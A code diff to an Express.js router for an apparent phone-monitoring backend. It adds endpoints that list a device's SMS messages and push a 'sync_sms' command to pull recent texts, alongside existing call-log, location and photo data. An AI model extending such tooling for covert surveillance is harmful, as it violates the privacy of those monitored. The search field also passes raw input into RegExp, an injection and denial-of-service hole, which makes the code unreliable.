@@ -1,5 +1,5 @@
 const express = require('express');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo } = require('../models');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS } = require('../models');
 const { protect } = require('./auth');
 const admin = require('firebase-admin');
 
@@ -772,6 +772,106 @@ router.post('/:deviceId/fcm-token', async (req, res) => {
   } catch (error) {
     console.error('Failed to update FCM token:', error);
     res.status(500).json({ error: 'Failed to update FCM token' });
+  }
+});
+
+// ============ SMS ENDPOINTS ============
+
+// Get SMS messages for a device
+router.get('/:deviceId/sms', protect, async (req, res) => {
+  try {
+    const { limit = 100, page = 1, search, type } = req.query;
+    const deviceIdParam = req.params.deviceId;
+
+    // Find device
+    let device = await Device.findOne({ _id: deviceIdParam, owner: req.user._id });
+    if (!device) {
+      device = await Device.findOne({ deviceId: deviceIdParam, owner: req.user._id });
+    }
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    // Build query
+    const query = { deviceId: device.deviceId };
+    if (type) query.type = type;
+    if (search) {
+      query.$or = [
+        { address: new RegExp(search, 'i') },
+        { contactName: new RegExp(search, 'i') },
+        { body: new RegExp(search, 'i') }
+      ];
+    }
+
+    const skip = (parseInt(page) - 1) * parseInt(limit);
+
+    const [sms, total] = await Promise.all([
+      SMS.find(query)
+        .sort({ date: -1 })
+        .skip(skip)
+        .limit(parseInt(limit)),
+      SMS.countDocuments(query)
+    ]);
+
+    res.json({
+      sms: sms.map(m => ({
+        id: m._id.toString(),
+        address: m.address,
+        contactName: m.contactName,
+        body: m.body,
+        type: m.type,
+        read: m.read,
+        date: m.date
+      })),
+      total,
+      pages: Math.ceil(total / parseInt(limit)),
+      currentPage: parseInt(page)
+    });
+  } catch (error) {
+    console.error('Failed to get SMS:', error);
+    res.status(500).json({ error: 'Failed to get SMS' });
+  }
+});
+
+// Request SMS sync from device
+router.post('/:deviceId/sms/sync', protect, async (req, res) => {
+  try {
+    const { hours = 48 } = req.body;
+
+    const device = await Device.findOne({
+      _id: req.params.deviceId,
+      owner: req.user._id
+    });
+
+    if (!device) {
+      return res.status(404).json({ error: 'Device not found' });
+    }
+
+    if (!device.fcmToken) {
+      return res.status(400).json({ error: 'Device not connected' });
+    }
+
+    if (!admin.apps.length) {
+      return res.status(503).json({ error: 'Push notifications not configured' });
+    }
+
+    await admin.messaging().send({
+      token: device.fcmToken,
+      data: {
+        command: 'sync_sms',
+        hours: hours.toString()
+      },
+      android: { priority: 'high' }
+    });
+
+    res.json({
+      success: true,
+      message: 'SMS sync request sent to device'
+    });
+  } catch (error) {
+    console.error('Failed to request SMS sync:', error);
+    res.status(500).json({ error: 'Failed to send sync request' });
   }
 });
 
